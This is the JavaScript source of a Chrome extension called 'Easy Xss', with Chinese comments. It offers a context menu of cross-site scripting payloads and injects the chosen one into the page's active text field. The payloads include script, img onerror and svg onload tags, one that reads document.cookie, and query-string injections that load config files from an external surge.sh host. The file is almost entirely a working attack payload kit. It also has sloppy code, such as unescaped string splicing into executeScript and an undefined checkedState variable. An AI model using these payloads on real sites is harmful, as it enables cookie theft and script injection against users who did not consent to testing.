/*
这是谷歌浏览器插件的app.js文件。
Easy Xss是一个小插件，它会创建一个包含有效载荷的上下文菜单。
当您点击该有效载荷时，它将被插入到当前页面的文本输入框。
https://chrome.google.com/webstore/detail/easy-xss/your-extension-id
修改Easy Xss有效载荷。
添加一些常见的有效载荷
*/

function onCreated() {
  if (chrome.runtime.lastError) {
    console.log(`Error: ${chrome.runtime.lastError}`);
  } else {
    console.log("Item created successfully");
  }
}

function onError(error) {
  console.log(`Error: ${error}`);
}

function insertTextToInput(str) {
  chrome.tabs.executeScript({
    code: `var activeElement = document.activeElement;
           if (activeElement.tagName.toLowerCase() === 'input' || activeElement.tagName.toLowerCase() === 'textarea') {
             activeElement.value += '${str}';
           }`
  });
}

chrome.contextMenus.create({
  id: "log-selection",
  title: chrome.i18n.getMessage("menuItemSelectionLogger"),
  contexts: ["selection"]
}, onCreated);


chrome.contextMenus.create({
  id: "separator-1",
  type: "separator",
  contexts: ["all"]
}, onCreated);

chrome.contextMenus.create({
  id: "payload1",
  type: "radio",
  title: '<script>alert(1)</script>',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload2",
  type: "radio",
  title: '"><script>alert(1)</script>',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload3",
  type: "radio",
  title: '<img src="x" onerror="alert(1);">',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload4",
  type: "radio",
  title: '<svg/onload = alert(1);>',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload5",
  type: "radio",
  title: '"><img src=x onerror=write(document.domain)>',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload6",
  type: "radio",
  title: '<applet code="javascript:confirm(document.cookie);">',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload7",
  type: "radio",
  title: '<img src=x onerror=alert("XSS")>.png',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload8",
  type: "radio",
  title: '<Input value = "XSS" type = text>',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload9",
  type: "radio",
  title: '"><svg/onload=confirm(1)>"@x.y',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload10",
  type: "radio",
  title: '?configUrl=https://jumpy-floor.surge.sh/test.json',
  contexts: ["all"],
  checked: true,

}, onCreated);

chrome.contextMenus.create({
  id: "payload11",
  type: "radio",
  title: '?url=https://jumpy-floor.surge.sh/test.yaml',
  contexts: ["all"],
  checked: true,

}, onCreated);

function updateCheckUncheck() {
  checkedState = !checkedState;
  if (checkedState) {
    chrome.contextMenus.update("check-uncheck", {
      title: chrome.i18n.getMessage("menuItemUncheckMe"),
    });
  } else {
    chrome.contextMenus.update("check-uncheck", {
      title: chrome.i18n.getMessage("menuItemCheckMe"),
    });
  }
}

chrome.contextMenus.onClicked.addListener((info, tab) => {
  switch (info.menuItemId) {
    case "log-selection":
      console.log(info.selectionText);
      break;
    case "payload1":
      insertTextToInput('<script>alert(1)</script>');
      break;
    case "payload2":
      insertTextToInput('"><script>alert(1)</script>');
      break;
    case "payload3":
      insertTextToInput('<img src="x" onerror="alert(1);">');
      break;
    case "payload4":
      insertTextToInput('<svg/onload = alert(1);>');
      break;
    case "payload5":
      insertTextToInput('"><img src=x onerror=write(document.domain)>');
      break;  
    case "payload6":
      insertTextToInput('<applet code="javascript:confirm(document.cookie);">');
      break;  
    case "payload7":
      insertTextToInput('<img src=x onerror=alert("XSS")>.png');
      break;  
    case "payload8":
      insertTextToInput('<Input value = "XSS" type = text>');
      break;  
    case "payload9":
      insertTextToInput('"><svg/onload=confirm(1)>"@x.y');
      break;  
    case "payload10":
      insertTextToInput('?configUrl=https://jumpy-floor.surge.sh/test.json');
      break; 
    case "payload11":
      insertTextToInput('?url=https://jumpy-floor.surge.sh/test.yaml');
      break; 
  }
});

